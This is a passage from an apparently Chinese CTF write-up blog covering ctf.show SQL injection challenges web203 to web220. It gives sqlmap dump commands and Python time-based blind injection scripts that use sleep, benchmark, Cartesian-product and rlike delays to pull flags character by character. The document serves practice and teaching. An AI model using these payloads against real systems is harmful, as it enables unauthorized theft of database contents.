plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://ef1c4fb9-5fb4-45d0-96e6-721fe5bdbce3.challenge.ctf.show/api/index.php&quot; --data=&quot;id=1&quot; --referer=ctf.show --method=PUT --headers=&quot;Content-Type: text/plain&quot; -D ctfshow_web -T ctfshow_user --dump</span><br></pre></td></tr></table></figure><p>(这里我是懒得一步一步的去查数据库和表了，就直接用上一个的了)</p><p><img src="../images/image-20221231221803548.png" alt="image-20221231221803548"></p><h2 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h2><p>源码</p><p><img src="../images/image-20221231222031810.png" alt="image-20221231222031810"></p><p>新增加了个cookie提交。</p><p><img src="../images/image-20221231222112530.png" alt="image-20221231222112530"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里我也不知道出现啥问题了，直接写的payload在kali下的sqlmap 打不通   拿别人的pl也没用，好奇怪</span><br></pre></td></tr></table></figure><h2 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h2><p>源码</p><p><img src="../images/image-20230101152042762.png" alt="image-20230101152042762"></p><p>通过抓包分析，在每次请求<code>url/api/index.php</code>之前需要先请求<code>URL/api/getTokn.php</code>，大家可以用burpsuite抓包看看确实是这么回事</p><p>所以我们需要两个参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--safe-url 设置在测试目标地址前访问的安全链接</span><br><span class="line">--safe-freq 设置两次注入测试前访问安全链接的次数</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230101152312909.png" alt="image-20230101152312909"></p><p>摘自Y4tacker师傅的博客   <a href="https://blog.csdn.net/solitudi/article/details/110144623">https://blog.csdn.net/solitudi/article/details/110144623</a></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://98a8a8b4-a308-4ec4-93e7-b072c3971d27.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --dbms=mysql dbs=ctfshow_web -T ctfshow_flax -C flagx --dump  --headers=&quot;Content-Type: text/plain&quot; --safe-url=http://98a8a8b4-a308-4ec4-93e7-b072c3971d27.challenge.ctf.show/api/getToken.php --safe-freq=1</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230101153109959.png" alt="image-20230101153109959"></p><p>这里是直接打payload，师傅们可以按照前面的步骤来一步一步的打。</p><h2 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h2><p>源码</p><p><img src="../images/image-20230101153400105.png" alt="image-20230101153400105"></p><p>这里的话是闭不闭合都无所谓，因为sqlmap会自己判断。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://0e551b3e-f8f4-4d09-9bbb-5a95ca5f0334.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --dbms=mysql -D &quot;ctfshow_web&quot; -T &quot;ctfshow_flaxc&quot; -C &quot;flagv&quot; --dump  --headers=&quot;Content-Type: text/plain&quot; --safe-url=http://0e551b3e-f8f4-4d09-9bbb-5a95ca5f0334.challenge.ctf.show/api/getToken.php --safe-freq=1</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230101153947876.png" alt="image-20230101153947876"></p><p>这里是直接打payload，师傅们可以按照前面的步骤来一步一步的做。</p><h2 id="web207-web213"><a href="#web207-web213" class="headerlink" title="web207  -  web213"></a>web207  -  web213</h2><p>大家可以看看Y4tacker师傅的博客，我就不写了</p><p><a href="https://blog.csdn.net/solitudi/article/details/110144623">https://blog.csdn.net/solitudi/article/details/110144623</a></p><h2 id="web214-时间盲注"><a href="#web214-时间盲注" class="headerlink" title="web214(时间盲注)"></a>web214(时间盲注)</h2><p>源码</p><p><img src="../images/image-20230101170048693.png" alt="image-20230101170048693"></p><p>注入点在url/api/</p><p>群主写的wp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://b435d6fe-5f89-40c5-9d51-c6b900d102e1.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">flagstr=<span class="string">&quot;&#123;&#125;qwertyuiopasdfghjklzxcvbnm-_,0123456789&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;if((ascii(substr((select database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i, ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_flagx,ctfshow_info</span></span><br><span class="line">        <span class="comment">#payload = &quot;if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagx&#x27;),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#id, flaga, inf</span></span><br><span class="line">        payload = <span class="string">&quot;if((ascii(substr((select flaga from ctfshow_flagx),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">ord</span>(x))</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">1</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.post(url = url,data = data,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;----------------------&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#try except  ---&gt;这两个是处理异常用的，如果执行sleep(3)了话，那对try来说就是异常了，因为timeout规定的是2s,异常的话就会执行except下的代码。</span></span><br></pre></td></tr></table></figure><p>然后跟着上面的走就能拿到flag了。</p><p>看了这么多脚本的编写，自己也会写一点了(记录一下这个时刻)</p><h2 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h2><p>源码</p><p><img src="../images/image-20230101175616535.png" alt="image-20230101175616535"></p><p>这里提示了用’  ‘   单引号。</p><p>就是同样用单引号给闭合注释掉就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or xxxxxxxxxx#  ----&gt;这样就可以了。</span><br></pre></td></tr></table></figure><p>那么我们就拿上一题的脚本拿来修改修改就好了。</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://d1e3eb87-f09e-4e69-9811-9765e724a946.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">flagstr=<span class="string">&quot;&#123;&#125;qwertyuiopasdfghjklzxcvbnm-_,0123456789&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;if((ascii(substr((select database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;&#x27; or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i, ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_flagxc,ctfshow_info</span></span><br><span class="line">        <span class="comment">#payload = &quot;&#x27; or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#id,flagaa,i</span></span><br><span class="line">        payload = <span class="string">&quot;&#x27; or if((ascii(substr((select flagaa from ctfshow_flagxc),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(x))</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">1</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.post(url = url,data = data,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;----------------------&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#try except  ---&gt;这两个是处理异常用的，如果执行sleep(3)了话，那对try来说就是异常了，因为timeout规定的是2s,异常的话就会执行except下的代码。</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230103185247275.png" alt="image-20230103185247275"></p><p>拿到flag了。</p><h2 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h2><p>源码</p><p><img src="../images/image-20230103190103648.png" alt="image-20230103190103648"></p><p>题目增加了个base64编码，但是影响不大，这样还是可以绕过，抓个包，然后进行下面的分析就能绕过了。</p><p><img src="../images/image-20230103190054969.png" alt="image-20230103190054969"></p><p>修改后的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&#x27;http://18b8abd6-51e2-4fb8-90ce-f2887bc5ab82.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">flagstr=<span class="string">&quot;&#123;&#125;qwertyuiopasdfghjklzxcvbnm-_,0123456789&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;if((ascii(substr((select database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;&#x27;abc&#x27;) or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i, ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_flagxcc,ct</span></span><br><span class="line">        <span class="comment">#payload = &quot;&#x27;abc&#x27;) or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxcc&#x27;),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#id,flagaac,i</span></span><br><span class="line">        payload = <span class="string">&quot;&#x27;adb&#x27;) or if((ascii(substr((select flagaac from ctfshow_flagxcc),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(x))</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">1</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.post(url = url,data = data,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;----------------------&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#try except  ---&gt;这两个是处理异常用的，如果执行sleep(3)了话，那对try来说就是异常了，因为timeout规定的是2s,异常的话就会执行except下的代码。</span></span><br></pre></td></tr></table></figure><h2 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h2><p>源码</p><p><img src="../images/image-20230103192035743.png" alt="image-20230103192035743"></p><p>这里是吧sleep给过滤掉了。那么我们就可以用别的函数来替代sleep了。</p><p>这里就得用到benchmark函数了。</p><p><img src="../images/image-20230103192546638.png" alt="image-20230103192546638"></p><p>这个函数的功能 benchmark(次数，实现的计算)      </p><p>上图的意思就是进行了100000000次md5(1)的计算。</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&#x27;http://5d44e38e-dd70-49f9-aa22-472a67c5d0bb.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">flagstr=<span class="string">&quot;&#123;&#125;qwertyuiopasdfghjklzxcvbnm-_,0123456789&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;if((ascii(substr((select database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;999) or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;),benchmark(5000000,md5(1)),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_flagxccb,ct</span></span><br><span class="line">        <span class="comment">#payload = &quot;999) or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxccb&#x27;),&#123;&#125;,1))=&#123;&#125;),benchmark(5000000,md5(1)),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#id,flagaabc,i</span></span><br><span class="line">        payload = <span class="string">&quot;999) or if((ascii(substr((select flagaabc from ctfshow_flagxccb),&#123;&#125;,1))=&#123;&#125;),benchmark(5000000,md5(1)),1)#&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(x))</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">1</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.post(url = url,data = data,timeout=<span class="number">2</span>)</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;----------------------&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#try except  ---&gt;这两个是处理异常用的，如果执行sleep(3)了话，那对try来说就是异常了，因为timeout规定的是2s,异常的话就会执行except下的代码。</span></span><br></pre></td></tr></table></figure><h2 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h2><p>源码</p><p><img src="../images/image-20230103202950013.png" alt="image-20230103202950013"></p><p>这次把sleep和benchmark都给过滤掉了，那么我们还可以利用笛卡尔乘积</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">笛卡尔积又叫笛卡尔乘积，是一个叫笛卡尔的人提出来的。</span><br><span class="line">简单的说就是两个集合相乘的结果。</span><br><span class="line">具体的定义去看看有关代数系的书的定义。</span><br><span class="line">直观的说就是</span><br><span class="line">集合A&#123;a1,a2,a3&#125;</span><br><span class="line">集合B&#123;b1,b2&#125;</span><br><span class="line">他们的</span><br><span class="line">笛卡尔积</span><br><span class="line">是</span><br><span class="line">A*B</span><br><span class="line">=&#123;(a1,b1),(a1,b2),(a2,b1),(a2,b2),(a3,b1),(a3,b2)&#125;</span><br></pre></td></tr></table></figure><p>离散数学里会学到这个东西。</p><p><img src="../images/image-20230103225712432.png" alt="image-20230103225712432"></p><p><img src="../images/image-20230103230559724.png" alt="image-20230103230559724"></p><p><strong>这就是mysql里的笛卡尔乘积。</strong></p><p>这里能让其产生延迟的感觉就是查大量的数据的时候就会产生延迟。</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://45f61877-517c-463b-adae-cc648e4d6531.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">strr = <span class="string">&quot;1234567890&#123;&#125;-qazwsxedcrfvtgbyhnujmikolp&quot;</span></span><br><span class="line">j = <span class="number">1</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;1) and if(substr((select flagaac from ctfshow_flagxc),<span class="subst">&#123;j&#125;</span>,1)=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;,(select count(*) from ((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,7)c) limit 1),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">2.5</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            res += i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-----------------------&quot;</span>+res)</span><br><span class="line">            j+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1) and if(substr((select database())),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;,(select count(*) from ((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,7)c) limit 1),1</span><br></pre></td></tr></table></figure><p>可以第一个if判断改成2&gt;1,拿去题目那试一下，看是否产生延迟.</p><p><strong>limit</strong></p><p><img src="../images/image-20230104001113081.png" alt="image-20230104001113081"></p><p><img src="../images/image-20230104001125935.png" alt="image-20230104001125935"></p><p>limit 1,1就是返回第一行的数。<br><img src="../images/image-20230104001335990.png" alt="image-20230104001335990"></p><p>这个是返回第一行后面2行的数。</p><p>还有等等种可能，不理解的时候可以去本地去自己查询来理解。</p><h2 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h2><p>源码</p><p><img src="../images/image-20230104002030913.png" alt="image-20230104002030913"></p><p>把这个东西给过滤掉了，这里就得知<strong>rlike</strong>也是可以进行时间盲注的。</p><p>这里就要五种方法来进行时间盲注，<strong>sleep</strong>  <strong>benchmark</strong> <strong>rlike</strong>  <strong>笛卡尔乘积</strong> 还有一种是<strong>双链接</strong></p><p>双链接是啥我也不太清楚，感兴趣的可以自己去查查。</p><p><strong>rlike</strong></p><p>就是利用正则表达式来做.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">正侧匹配在匹配较长字符串但自由度比较高的字符串时会造成比较大的计算量，我们通过rpad或repeat构造长字符串，加以计算量大的pattern,通过控制字符串长度我们可以控制延时</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT if(1=1,(select rpad(&#x27;a&#x27;,4999999,&#x27;a&#x27;) RLIKE concat(repeat(&#x27;(a.*)+&#x27;,30),&#x27;b&#x27;)),0)</span><br></pre></td></tr></table></figure><p>这里用上一道题的脚本就行了。</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://45f61877-517c-463b-adae-cc648e4d6531.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">strr = <span class="string">&quot;1234567890&#123;&#125;-qazwsxedcrfvtgbyhnujmikolp&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;select table_name from information_schema.tables where table_schema=database() limit 0,1&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;select column_name from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27; limit 1,1&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;select flagaac from ctfshow_flagxc&quot;</span></span><br><span class="line">j = <span class="number">1</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;1) and if(substr((select flagaac from ctfshow_flagxc),<span class="subst">&#123;j&#125;</span>,1)=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;,(select count(*) from ((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,7)c) limit 1),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">2.5</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            res += i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-----------------------&quot;</span>+res)</span><br><span class="line">            j+=<span class="number">1</span></span><br><span class="line">          </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h2><p>源码</p><p><img src="../images/image-20230104003951518.png" alt="image-20230104003951518"></p><p>把substr给给过滤掉了，那么我们就得去使用别的函数了，left,right这些都可以。</p><p>脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="后面的sql题找个机会再去做，先做到这了"><a href="#后面的sql题找个机会再去做，先做到这了" class="headerlink" title="后面的sql题找个机会再去做，先做到这了"></a>后面的sql题找个机会再去做，先做到这了</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;web171&quot;&gt;&lt;a href=&quot;#web171&quot; class=&quot;headerlink&quot; title=&quot;web171&quot;&gt;&lt;/a&gt;web171&lt;/h2&gt;&lt;p&gt;源码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20221226192746294.</summary>
      
    
    
    
    
